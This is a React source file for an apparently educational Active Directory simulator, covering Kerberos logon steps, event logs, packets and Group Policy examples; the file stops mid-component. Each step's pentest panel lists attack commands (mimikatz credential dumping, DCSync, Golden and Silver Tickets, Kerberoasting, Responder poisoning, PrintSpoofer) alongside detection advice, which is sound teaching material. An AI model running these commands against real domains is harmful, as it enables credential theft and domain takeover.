import React, { useState, useEffect } from 'react';
import {
  Server,
  Globe,
  Sliders,
  Key,
  Shield,
  ShieldCheck,
  ShieldAlert,
  Terminal,
  Database,
  Users,
  FolderTree,
  Lock,
  Unlock,
  CheckSquare,
  Square,
  FileText,
  CheckCircle2,
  AlertTriangle,
  ChevronRight,
  ChevronDown,
  Play,
  Pause,
  SkipForward,
  SkipBack,
  RotateCcw,
  Sparkles,
  Command,
  Laptop,
  HardDrive,
  Search,
  Award,
  Activity,
  ArrowRight,
  Radio,
  ExternalLink,
  Cpu,
  Eye,
  EyeOff,
  Zap,
  Crosshair,
  Info
} from 'lucide-react';

// ============================================================
// HOW ACTIVE DIRECTORY WORKS - 6-STEP SIMULATOR DATA MODEL
// ============================================================
const AD_SIM_STEPS = [
  {
    step: 1,
    title: "1. Machine Boot & Secure Channel",
    trainerQuote: "A user switches on a domain-joined computer.",
    summary: "Workstation powers on, initializes TCP/IP stack, and contacts Domain Controller via Netlogon RPC to verify machine account trust (WIN11-PC01$).",
    activeNodeIds: ['client', 'dc'],
    traffic: {
      from: 'WIN11-PC01 (Client)',
      to: 'DC01.corp.example (DC)',
      proto: 'Netlogon / RPC / SMB',
      port: 'Port 445 / 135',
      summary: 'Verifying computer account trust secret'
    },
    internals: {
      lsaAction: "Netlogon service reads computer account password from Local LSA Secrets (HKLM\\SECURITY\\Policy\\Secrets).",
      account: "WIN11-PC01$ (Computer Object in CN=Computers,DC=corp,DC=example)",
      channel: "Establishes secure channel via RPC session setup. Passwords rotate every 30 days automatically.",
      eventLog: {
        id: 4624,
        source: "Microsoft-Windows-Security-Auditing",
        type: "Success Audit",
        task: "Logon (Logon Type 5 - Service / Machine Startup)",
        details: "An account was successfully logged on.\nSubject:\n  Security ID: NT AUTHORITY\\SYSTEM\n  Account Name: WIN11-PC01$\n  Logon Type: 5 (Service)\n  Workstation Name: WIN11-PC01\n  Process: C:\\Windows\\System32\\services.exe"
      }
    },
    pentest: {
      attackTitle: "Machine Account Compromise & Secure Channel Attacks",
      tricksRef: "Tricks-Pentest-Active-Directory / Machine Accounts",
      description: "Domain computers have computer accounts ($) with active domain credentials. If an attacker gains SYSTEM rights on a workstation, they can dump the computer account's NTLM hash and ticket using Mimikatz, impersonating the computer across the network.",
      commands: [
        "mimikatz # privilege::debug",
        "mimikatz # token::elevate",
        "mimikatz # lsadump::secrets",
        "# Check for Netlogon RPC Zerologon (CVE-2020-1472):",
        "python3 zerologon_tester.py DC01 192.168.56.10"
      ],
      blueTeamDetection: "Audit Event ID 5805 (Netlogon session setup failure) and monitor abnormal machine account logons."
    },
    packet: {
      protocol: "SMB2 / NETLOGON RPC",
      src: "192.168.56.25:49152",
      dst: "192.168.56.10:445",
      type: "NetrServerAuthenticate3 Request",
      fields: [
        { label: "Account Name", val: "WIN11-PC01$" },
        { label: "Secure Channel Type", val: "ServerSecureChannel (0x06)" },
        { label: "Negotiated Cipher", val: "AES-128 / SHA256 RPC Integrity" },
        { label: "Status Return", val: "STATUS_SUCCESS (0x00000000)" }
      ]
    }
  },
  {
    step: 2,
    title: "2. Credential Input & Pre-Authentication",
    trainerQuote: "The user enters domain credentials.",
    summary: "User enters username and password on the Windows logon screen. LSASS calculates a pre-authentication timestamp encrypted with the user's password hash.",
    activeNodeIds: ['client'],
    traffic: {
      from: 'User / LogonUI',
      to: 'LSASS.exe (Local Memory)',
      proto: 'Local LSA / Kerberos Pre-Auth',
      port: 'Internal Memory',
      summary: 'Encrypting PA-ENC-TIMESTAMP with user password key'
    },
    internals: {
      lsaAction: "LogonUI passes credentials to LSASS (Local Security Authority). Kerberos SSP derives an AES-256 key from Alice's password and encrypts the current UTC timestamp.",
      account: "User Principal Name: alice@corp.example (Down-level logon: CORP\\alice)",
      channel: "Pre-authentication proves the user knows the password before the KDC sends a Ticket Granting Ticket.",
      eventLog: {
        id: 4768,
        source: "Microsoft-Windows-Security-Auditing",
        type: "Audit Success",
        task: "Kerberos Authentication Service (AS)",
        details: "A Kerberos authentication ticket (TGT) request was initialized.\nAccount Information:\n  Account Name: alice\n  Supplied Realm: CORP.EXAMPLE\n  Pre-Authentication Type: 19 (PA-ENC-TIMESTAMP / AES256-CTS-HMAC-SHA1-96)"
      }
    },
    pentest: {
      attackTitle: "AS-REP Roasting & LSASS Memory Extraction",
      tricksRef: "Tricks-Pentest-Active-Directory / AS-REP Roasting",
      description: "If an AD user account has the 'Do not require Kerberos preauthentication' (DONT_REQ_PREAUTH) attribute set, an attacker can request a TGT without knowing the password. The KDC sends back an AS-REP containing the password hash, which can be cracked offline with Hashcat mode 18200!",
      commands: [
        "# Query accounts vulnerable to AS-REP Roasting:",
        "python3 GetNPUsers.py corp.example/ -no-pass -usersfile users.txt -format hashcat -output asrep.txt",
        "# Crack captured AS-REP ticket offline:",
        "hashcat -m 18200 -a 0 asrep.txt rockyou.txt",
        "# Dump plaintext credentials from LSASS memory:",
        "mimikatz # sekurlsa::logonpasswords"
      ],
      blueTeamDetection: "Audit Event ID 4768 filtering for Pre-Authentication Type 0 (no pre-authentication used) on non-service accounts."
    },
    packet: {
      protocol: "Local Windows LSA Subsystem",
      src: "LogonUI.exe",
      dst: "lsass.exe (Kerberos.dll)",
      type: "LsaLogonUser() API Dispatch",
      fields: [
        { label: "Target Account", val: "alice@corp.example" },
        { label: "Auth Package", val: "Kerberos (MICROSOFT_KERBEROS_NAME_A)" },
        { label: "Key Derivation", val: "PBKDF2 HMAC-SHA1 (AES256 String-to-Key)" },
        { label: "Pre-Auth Data", val: "PA-ENC-TIMESTAMP (UTC: 2026-11-14 10:55:02)" }
      ]
    }
  },
  {
    step: 3,
    title: "3. DNS SRV Lookup & DC Contact",
    trainerQuote: "The computer contacts a Domain Controller.",
    summary: "The workstation performs a DNS SRV lookup (_ldap._tcp.dc._msdcs.corp.example) to find the nearest Domain Controller, then sends a Kerberos AS-REQ over port 88.",
    activeNodeIds: ['client', 'dns', 'dc'],
    traffic: {
      from: 'WIN11-PC01 (Client)',
      to: 'DNS01 -> DC01.corp.example',
      proto: 'DNS (53) -> Kerberos AS-REQ (88)',
      port: 'Port 53 & Port 88 UDP',
      summary: 'Locating DC via DNS SRV and sending AS-REQ ticket request'
    },
    internals: {
      lsaAction: "Netlogon sends DNS SRV query to discover Domain Controllers in the current Active Directory site. Client opens UDP socket on port 88 to DC01.",
      account: "Target Service: krbtgt/corp.example",
      channel: "Transmits KRB_AS_REQ containing user identity and pre-authentication timestamp data.",
      eventLog: {
        id: 3008,
        source: "Microsoft-Windows-DNS-Client",
        type: "Information",
        task: "DNS Resolution",
        details: "DNS query name: _ldap._tcp.dc._msdcs.corp.example\nQuery Type: 33 (SRV)\nResolved Target: dc01.corp.example\nPort: 389, Priority: 0, Weight: 100\nDC IP Address: 192.168.56.10"
      }
    },
    pentest: {
      attackTitle: "LLMNR / NBT-NS Poisoning & Rogue DC Spoofing",
      tricksRef: "Tricks-Pentest-Active-Directory / LLMNR-NBTNS-Poisoning",
      description: "When DNS lookup fails or secondary domains are mistyped, Windows broadcasts LLMNR/NBT-NS queries. An attacker running Responder can poison these broadcasts, spoofing the Domain Controller to intercept NTLMv2 challenge-response hashes!",
      commands: [
        "# Start Responder on the network interface:",
        "sudo responder -I eth0 -rdw -v",
        "# Query AD SRV records from Linux pentest machine:",
        "nslookup -type=SRV _ldap._tcp.dc._msdcs.corp.example",
        "# Probe active domain controllers with NetExec:",
        "nxc smb 192.168.56.0/24"
      ],
      blueTeamDetection: "Disable LLMNR via GPO ('Turn off multicast name resolution') and disable NetBIOS over TCP/IP across all network adapters."
    },
    packet: {
      protocol: "Kerberos 5 (RFC 4120) / AS-REQ",
      src: "192.168.56.25:52180",
      dst: "192.168.56.10:88",
      type: "KRB_AS_REQ (Message Type: 10)",
      fields: [
        { label: "Client Realm", val: "CORP.EXAMPLE" },
        { label: "Client Name (cname)", val: "alice" },
        { label: "Server Name (sname)", val: "krbtgt/CORP.EXAMPLE" },
        { label: "padata", val: "PA-ENC-TIMESTAMP (Encryption: AES256-CTS)" }
      ]
    }
  },
  {
    step: 4,
    title: "4. DC Validates Credentials in NTDS.dit",
    trainerQuote: "The Domain Controller validates the credentials.",
    summary: "DC01 receives the AS-REQ, queries NTDS.dit for Alice's account, decrypts the timestamp using Alice's stored key, and mints an encrypted Ticket Granting Ticket (TGT).",
    activeNodeIds: ['dc', 'client'],
    traffic: {
      from: 'DC01.corp.example (KDC)',
      to: 'WIN11-PC01 (Client)',
      proto: 'Kerberos AS-REP',
      port: 'Port 88 UDP',
      summary: 'Returning TGT encrypted with krbtgt key & session key'
    },
    internals: {
      lsaAction: "DC KDC service extracts Alice's key from C:\\Windows\\NTDS\\NTDS.dit. Decrypts PA-ENC-TIMESTAMP to verify password. Creates TGT encrypted with krbtgt key and sends KRB_AS_REP.",
      account: "KDC Service: krbtgt (Key Distribution Center Master Account)",
      channel: "TGT contains: User SID, Group SIDs (PAC), session key, validity period (10 hrs), and renewal period (7 days).",
      eventLog: {
        id: 4768,
        source: "Microsoft-Windows-Security-Auditing",
        type: "Audit Success",
        task: "Kerberos Authentication Service (AS)",
        details: "A Kerberos authentication ticket (TGT) was requested.\nTarget Information:\n  Target User Name: alice\n  Target Domain: CORP.EXAMPLE\nService Information:\n  Service Name: krbtgt\nTicket Options: 0x40810010\nTicket Encryption Type: 0x12 (AES-256-CTS-HMAC-SHA1-96)\nClient Address: 192.168.56.25"
      }
    },
    pentest: {
      attackTitle: "Golden Ticket & DCSync Domain Dominance",
      tricksRef: "Tricks-Pentest-Active-Directory / Golden Ticket & DCSync",
      description: "If an attacker compromises Domain Admin rights, they can use DCSync to steal the krbtgt account password hash. With the krbtgt hash, the attacker can forge their own Golden Tickets (TGTs) for any user, grant Enterprise Admin rights, and bypass password resets for up to 10 years!",
      commands: [
        "# DCSync attack to replicate krbtgt hash via DRSUAPI:",
        "mimikatz # lsadump::dcsync /domain:corp.example /user:krbtgt",
        "# Forge Golden Ticket (TGT) with mimikatz:",
        "mimikatz # kerberos::golden /user:Administrator /domain:corp.example /sid:S-1-5-21-394829102 /krbtgt:0123456789abcdef0123456789abcdef /ticket:golden.kirbi",
        "# Inject ticket into current session (Pass-the-Ticket):",
        "mimikatz # kerberos::ptt golden.kirbi"
      ],
      blueTeamDetection: "Audit Event ID 4662 (Directory Service Access) to detect unauthorized DRSUAPI replication calls from non-DC workstations."
    },
    packet: {
      protocol: "Kerberos 5 (RFC 4120) / AS-REP",
      src: "192.168.56.10:88",
      dst: "192.168.56.25:52180",
      type: "KRB_AS_REP (Message Type: 11)",
      fields: [
        { label: "Ticket Granting Ticket", val: "Encrypted with krbtgt AES-256 Key" },
        { label: "Embedded PAC", val: "User SID S-1-5-21-...-1104, Group SIDs" },
        { label: "Encrypted Session Key", val: "Encrypted with Alice's AES-256 Key" },
        { label: "Ticket Lifetime", val: "10 Hours (Renewable up to 7 Days)" }
      ]
    }
  },
  {
    step: 5,
    title: "5. Windows Builds User Security Context",
    trainerQuote: "Windows establishes the user's security context.",
    summary: "Workstation LSASS decrypts the session key, caches the TGT, unpacks the PAC containing Alice's SIDs, and builds the Windows Access Token. Explorer.exe launches.",
    activeNodeIds: ['client'],
    traffic: {
      from: 'LSASS.exe',
      to: 'Winlogon / Explorer.exe',
      proto: 'Windows Security Subsystem',
      port: 'Local Token Handle',
      summary: 'Building Access Token with User SID, Group SIDs & Privileges'
    },
    internals: {
      lsaAction: "LSASS validates the PAC signature with the KDC key. It constructs the primary Access Token containing Alice's User SID, Group SIDs, and Privileges. Explorer.exe is spawned.",
      account: "User SID: S-1-5-21-394829102-1104 | Groups: Domain Users (513), Finance_Team (1102)",
      channel: "All applications launched by Alice inherit this security context, enabling seamless Single Sign-On (SSO).",
      eventLog: {
        id: 4624,
        source: "Microsoft-Windows-Security-Auditing",
        type: "Audit Success",
        task: "Logon",
        details: "An account was successfully logged on.\nLogon Information:\n  Logon Type: 2 (Interactive - physical keyboard & screen)\n  Account Name: alice\n  Account Domain: CORP\n  Security ID: CORP\\alice\n  Process Name: C:\\Windows\\System32\\lsass.exe\n  Elevated Token: No"
      }
    },
    pentest: {
      attackTitle: "Token Impersonation & Privilege Escalation",
      tricksRef: "Tricks-Pentest-Active-Directory / Token Manipulation",
      description: "Once logged on, local processes run with the user's Access Token. If an attacker gains access to a service account with SeImpersonatePrivilege, they can hijack tokens belonging to higher privileged users using Potato exploits (PrintSpoofer, SweetPotato) to elevate to SYSTEM!",
      commands: [
        "# Check current token privileges:",
        "whoami /priv",
        "# Exploit SeImpersonatePrivilege with PrintSpoofer:",
        ".\\PrintSpoofer.exe -i -c cmd.exe",
        "# Enumerate tokens in memory with Incognito:",
        "meterpreter > load incognito",
        "meterpreter > list_tokens -u",
        "meterpreter > impersonate_token CORP\\\\Administrator"
      ],
      blueTeamDetection: "Audit Event ID 4672 (Special privileges assigned) and Event ID 4673 (Sensitive privilege service called)."
    },
    packet: {
      protocol: "Windows Security Subsystem / Access Token",
      src: "lsass.exe",
      dst: "explorer.exe",
      type: "NtCreateToken / TokenImpersonation",
      fields: [
        { label: "Token Handle", val: "0x000004BC" },
        { label: "User Principal", val: "CORP\\alice (SID: S-1-5-21-...-1104)" },
        { label: "Group Membership", val: "Domain Users, Finance_Team, All_Staff" },
        { label: "Privileges", val: "SeChangeNotifyPrivilege (Enabled)" }
      ]
    }
  },
  {
    step: 6,
    title: "6. Authorized Network Resource Access",
    trainerQuote: "The user accesses authorized network resources.",
    summary: "When Alice accesses a network file share (\\\\FS01\\Finance_Archive$), the PC requests a Service Ticket from DC01 (TGS-REQ/REP) and presents it to FS01 over SMB Port 445.",
    activeNodeIds: ['client', 'dc', 'fs'],
    traffic: {
      from: 'WIN11-PC01 -> DC01 -> FS01',
      to: 'FS01.corp.example (SMB Share)',
      proto: 'Kerberos TGS (88) -> SMB2/3 (445)',
      port: 'Port 88 & Port 445 TCP',
      summary: 'Requesting Service Ticket for cifs/FS01 and accessing \\\\FS01\\Finance_Archive$'
    },
    internals: {
      lsaAction: "PC checks ticket cache (klist). If empty, sends KRB_TGS_REQ with Alice's TGT to DC01. DC validates TGT and returns KRB_TGS_REP. PC connects to FS01 over SMB Port 445 presenting the Service Ticket.",
      account: "Service Principal Name (SPN): cifs/FS01.corp.example",
      channel: "FS01 decrypts ticket using its computer key, verifies PAC signatures, compares Alice's Group SIDs with folder NTFS ACLs, and grants access without prompting for passwords!",
      eventLog: {
        id: 4769,
        source: "Microsoft-Windows-Security-Auditing",
        type: "Audit Success",
        task: "Kerberos Service Ticket Operations",
        details: "A Kerberos service ticket was requested.\nAccount Information:\n  Account Name: alice@CORP.EXAMPLE\nService Information:\n  Service Name: cifs/FS01\n  Service ID: S-1-5-21-394829102-1108\nTicket Encryption Type: 0x12 (AES-256)\nClient Address: 192.168.56.25"
      }
    },
    pentest: {
      attackTitle: "Kerberoasting & Silver Ticket Attacks",
      tricksRef: "Tricks-Pentest-Active-Directory / Kerberoasting & Silver Ticket",
      description: "Any valid domain user can request a Kerberos Service Ticket (TGS) for any service with an SPN registered to a user account (e.g. MSSQL, IIS). The ticket is encrypted with that service account's password hash. Attackers extract the ticket and crack it offline with Hashcat mode 13100 (Kerberoasting)! A Silver Ticket forges access to a service without contacting the DC.",
      commands: [
        "# Enumerate SPNs and request Kerberoastable tickets:",
        "python3 GetUserSPNs.py corp.example/alice:Password@2026 -dc-ip 192.168.56.10 -request -outputfile kerberoast.txt",
        "# Crack captured Kerberos TGS-REP hash offline:",
        "hashcat -m 13100 -a 0 kerberoast.txt rockyou.txt",
        "# View cached tickets in Windows:",
        "klist",
        "# Forge Silver Ticket for CIFS service with Mimikatz:",
        "mimikatz # kerberos::golden /domain:corp.example /sid:S-1-5-21-394829102 /target:FS01.corp.example /service:cifs /rc4:hash /user:Administrator /ptt"
      ],
      blueTeamDetection: "Audit Event ID 4769 filtering for Encryption Type 0x17 (RC4-HMAC) and non-machine target accounts, and enforce gMSAs."
    },
    packet: {
      protocol: "SMB2 / Session Setup + Tree Connect",
      src: "192.168.56.25:52182",
      dst: "192.168.56.20:445",
      type: "SMB2_CREATE_REQ (\\\\FS01\\Finance_Archive$)",
      fields: [
        { label: "Target Share", val: "\\\\FS01\\Finance_Archive$" },
        { label: "Security Blob", val: "KRB_AP_REQ (Service Ticket for cifs/FS01)" },
        { label: "NTFS Evaluation", val: "CORP\\Finance_Team -> Read/Write Allowed" },
        { label: "Access Status", val: "STATUS_SUCCESS (0x00000000)" }
      ]
    }
  }
];


// ============================================================
// GPO CONFIGURATION CATEGORIES: COMPUTER VS USER DATA
// ============================================================
const GPO_COMPUTER_EXAMPLES = [
  {
    name: "Windows Firewall",
    scopeSummary: "Domain, Private & Public Profiles",
    icon: Shield,
    path: "Computer Configuration > Policies > Windows Settings > Security Settings > Windows Defender Firewall",
    regKey: "HKLM\\Software\\Policies\\Microsoft\\WindowsFirewall",
    desc: "Enforces inbound and outbound packet filtering rules across all network profiles. Blocks unapproved listening ports (e.g., SMB 445 on endpoints, RDP 3389) and mandates IPsec authentication and encryption between sensitive servers.",
    practicalUse: "Prevents worm propagation and lateral attacker movement by isolating endpoint workstations from one another."
  },
  {
    name: "Windows Defender settings",
    scopeSummary: "Real-time AV, Cloud Protection & ASR",
    icon: ShieldCheck,
    path: "Computer Configuration > Administrative Templates > Windows Components > Microsoft Defender Antivirus",
    regKey: "HKLM\\Software\\Policies\\Microsoft\\Windows Advanced Threat Protection",
    desc: "Centrally configures real-time antimalware protection, cloud-delivered threat intelligence, scheduled daily quick/full scans, and Attack Surface Reduction (ASR) rules that block malicious child process spawning (e.g. Office launching PowerShell).",
    practicalUse: "Stops ransomware execution and prevents local administrators or rogue users from disabling antivirus shields."
  },
  {
    name: "Security policies",
    scopeSummary: "Password Length, Account Lockout & Privileges",
    icon: Lock,
    path: "Computer Configuration > Policies > Windows Settings > Security Settings > Account Policies",
    regKey: "HKLM\\System\\CurrentControlSet\\Services\\Netlogon\\Parameters",
    desc: "Enforces enterprise account security standards: 12-character minimum password length, complexity requirements (uppercase, lowercase, numbers, symbols), 5-attempt account lockout threshold for 30 minutes, and User Rights Assignment (e.g. SeDebugPrivilege).",
    practicalUse: "Mitigates automated password spraying attacks and prevents unprivileged accounts from debugging system processes."
  },
  {
    name: "Software deployment",
    scopeSummary: "Automated MSI Installation at Boot",
    icon: HardDrive,
    path: "Computer Configuration > Policies > Software Settings > Software Installation",
    regKey: "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\AppManagement",
    desc: "Centrally assigns or deploys corporate MSI software packages across all domain workstations during computer startup before any user logs in. Software installs silently with elevated SYSTEM privileges.",
    practicalUse: "Automatically installs mission-critical software (EDR security sensors, Google Chrome, VPN clients) across 1,000+ PCs without manual IT visits."
  },
  {
    name: "System restrictions",
    scopeSummary: "USB Storage Blocking & Legacy Protocol Disabling",
    icon: AlertTriangle,
    path: "Computer Configuration > Administrative Templates > System > Removable Storage Access",
    regKey: "HKLM\\Software\\Policies\\Microsoft\\Windows\\RemovableStorageDevices",
    desc: "Restricts or completely prohibits removable USB flash drives, external hard disks, and CD/DVD write access. Can also disable legacy, insecure protocols like SMBv1, LLMNR, and NetBIOS.",
    practicalUse: "Eliminates USB-borne malware infection vectors and prevents malicious or accidental corporate data exfiltration."
  }
];

const GPO_USER_EXAMPLES = [
  {
    name: "Control Panel restrictions",
    scopeSummary: "Prohibit Access to Control Panel & Settings",
    icon: Sliders,
    path: "User Configuration > Administrative Templates > Control Panel > Prohibit access to Control Panel and PC settings",
    regKey: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoControlPanel",
    desc: "Completely disables access to both the classic Control Panel (control.exe) and the modern Windows 10/11 Settings app (SystemSettings.exe). Any attempt by standard users to launch them is blocked with an administrative notice.",
    practicalUse: "Prevents students, standard employees, or unauthorized personnel from altering network adapter IP addresses, modifying proxy settings, or uninstalling apps."
  },
  {
    name: "Desktop configuration",
    scopeSummary: "Enforced Wallpaper, Screensaver & Lockout",
    icon: Laptop,
    path: "User Configuration > Administrative Templates > Desktop > Desktop Wallpaper",
    regKey: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Wallpaper",
    desc: "Enforces an official corporate desktop wallpaper image, prevents users from changing their background, configures a 5-minute screensaver timeout, and mandates password re-entry on resume.",
    practicalUse: "Maintains organizational branding and guarantees unattended workstations lock automatically to defend against physical shoulder surfing."
  },
  {
    name: "Start Menu settings",
    scopeSummary: "Standardized Taskbar & Restricted Shutdown",
    icon: FileText,
    path: "User Configuration > Administrative Templates > Start Menu and Taskbar",
    regKey: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer",
    desc: "Deploys a standardized Start Menu layout, locks down the taskbar, hides administrative tool shortcuts, and removes the 'Shut Down', 'Restart', 'Sleep', and 'Hibernate' commands on public kiosks or lab workstations.",
    practicalUse: "Prevents classroom students from rebooting active computers and simplifies the interface for non-technical staff."
  },
  {
    name: "Folder redirection",
    scopeSummary: "Redirect Profile Folders to Network Share",
    icon: FolderTree,
    path: "User Configuration > Policies > Windows Settings > Folder Redirection",
    regKey: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders",
    desc: "Seamlessly redirects user profile folders (Documents, Desktop, Pictures, Downloads) from the local hard drive to a centralized enterprise file share (\\\\FS01\\Users$\\%USERNAME%). Operates with offline file caching.",
    practicalUse: "Ensures employee work files are continuously backed up to server storage and remain accessible from any computer they log into across the domain."
  },
  {
    name: "Login scripts",
    scopeSummary: "Automated Drive Mapping & Notice Banners",
    icon: Terminal,
    path: "User Configuration > Policies > Windows Settings > Scripts (Logon/Logoff)",
    regKey: "HKCU\\Software\\Policies\\Microsoft\\Windows\\System\\Scripts",
    desc: "Automatically triggers PowerShell (.ps1) or batch (.bat) logon scripts when the user authenticates, mapping department network shares (e.g. Z: \\\\FS01\\Finance) and setting up network printers based on security group membership.",
    practicalUse: "Mounts department resources automatically without user intervention and presents corporate acceptable-use policy banners upon logon."
  }
];

export default function WindowsServerTopic() {
  // Main Sub-Topic Navigation
  const [activeSection, setActiveSection] = useState('ad-intro'); // 'ad-intro' | 'ad-sim' | 'forests-dcs' | 'gpo' | 'auth' | 'scenario'

  // Interactive DC Discovery Simulator
  const [activeDcCmd, setActiveDcCmd] = useState('nltest /dsgetdc:corp.example');

  // Interactive GPO Engine State
  const [gpoSettings, setGpoSettings] = useState({
    controlPanel: true,
    usbBlock: true,
    passwordPolicy: true
  });
  const [gpOutput, setGpOutput] = useState('');

  // GPO Classification Container Filter & Selected Detail State
  const [gpoCategoryFilter, setGpoCategoryFilter] = useState('all'); // 'all' | 'computer' | 'user'
  const [selectedGpoDetail, setSelectedGpoDetail] = useState(null);

  // Interactive Kerberos Ticket Viewer State
  const [kerbTicketView, setKerbTicketView] = useState('tgt'); // 'tgt' | 'cifs'
  const [kerbStep, setKerbStep] = useState(0); // 0 to 4

  // ABC Technologies Scenario Checklist State
  const [scenarioTasks, setScenarioTasks] = useState({
    1: true, 2: true, 3: true, 4: true, 5: true, 6: false,
    7: false, 8: false, 9: false, 10: false, 11: false, 12: false
  });

  // ============================================================
  // AD 6-STEP LIFECYCLE SIMULATOR STATE
  // ============================================================
  const [adSimStep, setAdSimStep] = useState(1);
  const [adSimPlaying, setAdSimPlaying] = useState(false);
  const [adSimSpeed, setAdSimSpeed] = useState(4000); // 4000ms normal, 2000ms fast
  const [adSimTab, setAdSimTab] = useState('trainer'); // 'trainer' | 'internals' | 'pentest'
  const [showWirePacket, setShowWirePacket] = useState(false);

  // Auto-play timer
  useEffect(() => {
    let timer;
    if (adSimPlaying) {
      timer = setInterval(() => {
        setAdSimStep((prev) => (prev >= 6 ? 1 : prev + 1));
      }, adSimSpeed);
    }
    return () => clearInterval(timer);
  }, [adSimPlaying, adSimSpeed]);

  const currentSimStepData = AD_SIM_STEPS.find((s) => s.step === adSimStep) || AD_SIM_STEPS[0];

  const handleNextSimStep = () => {
    setAdSimStep((prev) => (prev >= 6 ? 1 : prev + 1));
  };

  const handlePrevSimStep = () => {
    setAdSimStep((prev) => (prev <= 1 ? 6 : prev - 1));
  };

  const toggleTask = (id) => {
    setScenarioTasks((prev) => ({ ...prev, [id]: !prev[id] }));
  };

  const completedTasksCount = Object.values(scenarioTasks).filter(Boolean).length;

  // Run GPO Update Simulation
  const runGpUpdateSim = () => {
    setGpOutput(
      `Updating policy on CLIENT-01 (corp.example)...
Computer Policy update has completed successfully.
User Policy update has completed successfully.

RSOP APPLIED GROUP POLICY OBJECTS (LSDOU HIERARCHY):
---------------------------------------------------
` +
      (gpoSettings.controlPanel
        ? `  [User Config]   ✓ Student_ControlPanel_Restriction (OU=Students) -> Access Prohibited\n`
        : `  [User Config]   ○ Student_ControlPanel_Restriction [Disabled]\n`) +
      (gpoSettings.usbBlock
        ? `  [Computer Config] ✓ Sec_Block_Removable_Storage (Domain=corp.example) -> All Classes Denied\n`
        : `  [Computer Config] ○ Sec_Block_Removable_Storage [Disabled]\n`) +
      (gpoSettings.passwordPolicy
        ? `  [Domain Level]    ✓ Default Domain Policy -> Min Length: 12, Complexity: Enabled, Age: 90d\n`
        : `  [Domain Level]    ○ Default Domain Policy [Disabled]\n`) +
      `
Fast-boot policy application complete. Settings enforced without reboot.`
    );
  };

  // Reusable Active Directory Lifecycle Simulation Render
  const renderAdLifecycleSimulation = () => (
    <div className="bg-slate-900 border border-slate-800 rounded-2xl p-4 sm:p-6 shadow-2xl space-y-6">
      {/* Simulation Header */}
      <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4 pb-4 border-b border-slate-800">
        <div>
          <div className="flex items-center gap-2 mb-1">
            <span className="px-2.5 py-0.5 rounded-full text-[10px] font-mono font-bold bg-cyan-950 border border-cyan-700 text-cyan-300">
              INTERACTIVE SIMULATION
            </span>
            <span className="px-2.5 py-0.5 rounded-full text-[10px] font-mono font-bold bg-purple-950 border border-purple-700 text-purple-300">
              6-STEP ENTERPRISE LIFECYCLE
            </span>
          </div>
          <h3 className="text-base sm:text-lg font-bold text-white flex items-center gap-2">
            <Activity className="w-5 h-5 text-cyan-400 animate-pulse" />
            How Active Directory Works (Interactive Lab Simulator)
          </h3>
          <p className="text-xs text-slate-400 mt-0.5">
            Step through how a domain client authenticates, contacts Domain Controllers, validates Kerberos tickets, builds local security context, and accesses network resources.
          </p>
        </div>

        {/* Playback Controls & Speed Toggle */}
        <div className="flex flex-wrap items-center gap-2 self-start lg:self-auto">
          {/* Prev / Play / Next / Reset */}
          <div className="flex items-center bg-slate-950 p-1 rounded-xl border border-slate-800 shadow-inner">
            <button
              onClick={handlePrevSimStep}
              title="Previous Step"
              className="p-1.5 rounded-lg text-slate-400 hover:text-white hover:bg-slate-800 transition cursor-pointer"
            >
              <SkipBack className="w-4 h-4" />
            </button>
            <button
              onClick={() => setAdSimPlaying(!adSimPlaying)}
              className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-bold transition cursor-pointer ${
                adSimPlaying
                  ? 'bg-amber-600 text-white shadow-lg shadow-amber-900/40'
                  : 'bg-cyan-600 hover:bg-cyan-500 text-black font-extrabold shadow-lg shadow-cyan-900/40'
              }`}
            >
              {adSimPlaying ? <Pause className="w-3.5 h-3.5 fill-current" /> : <Play className="w-3.5 h-3.5 fill-current" />}
              <span>{adSimPlaying ? 'Pause' : 'Auto Play'}</span>
            </button>
            <button
              onClick={handleNextSimStep}
              title="Next Step"
              className="p-1.5 rounded-lg text-slate-400 hover:text-white hover:bg-slate-800 transition cursor-pointer"
            >
              <SkipForward className="w-4 h-4" />
            </button>
            <button
              onClick={() => {
                setAdSimPlaying(false);
                setAdSimStep(1);
              }}
              title="Reset to Step 1"
              className="p-1.5 rounded-lg text-slate-400 hover:text-white hover:bg-slate-800 transition cursor-pointer ml-1"
            >
              <RotateCcw className="w-3.5 h-3.5" />
            </button>
          </div>

          {/* Speed Selector */}
          <div className="flex items-center bg-slate-950 p-1 rounded-xl border border-slate-800 text-[11px] font-mono">
            <button
              onClick={() => setAdSimSpeed(4000)}
              className={`px-2 py-1 rounded-lg transition cursor-pointer ${
                adSimSpeed === 4000 ? 'bg-purple-900/80 text-purple-200 font-bold' : 'text-slate-500 hover:text-slate-300'
              }`}
            >
              1x
            </button>
            <button
              onClick={() => setAdSimSpeed(2000)}
              className={`px-2 py-1 rounded-lg transition cursor-pointer ${
                adSimSpeed === 2000 ? 'bg-purple-900/80 text-purple-200 font-bold' : 'text-slate-500 hover:text-slate-300'
              }`}
            >
              2x
            </button>
          </div>
        </div>
      </div>

      {/* Step Pills Bar */}
      <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-6 gap-2">
        {AD_SIM_STEPS.map((s) => {
          const isActive = s.step === adSimStep;
          const isPast = s.step < adSimStep;
          return (
            <button
              key={s.step}
              onClick={() => {
                setAdSimStep(s.step);
                setAdSimPlaying(false);
              }}
              className={`text-left p-2.5 rounded-xl border transition-all cursor-pointer select-none ${
                isActive
                  ? 'border-cyan-400 bg-cyan-950/60 shadow-lg shadow-cyan-950/50 ring-1 ring-cyan-400'
                  : isPast
                  ? 'border-emerald-800/60 bg-emerald-950/20 text-emerald-300 hover:border-emerald-600'
                  : 'border-slate-800 bg-slate-950/60 text-slate-400 hover:border-slate-700'
              }`}
            >
              <div className="flex items-center justify-between mb-1">
                <span className={`text-[10px] font-mono font-bold ${isActive ? 'text-cyan-400' : isPast ? 'text-emerald-400' : 'text-slate-500'}`}>
                  STEP 0{s.step}
                </span>
                {isPast ? (
                  <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" />
                ) : isActive ? (
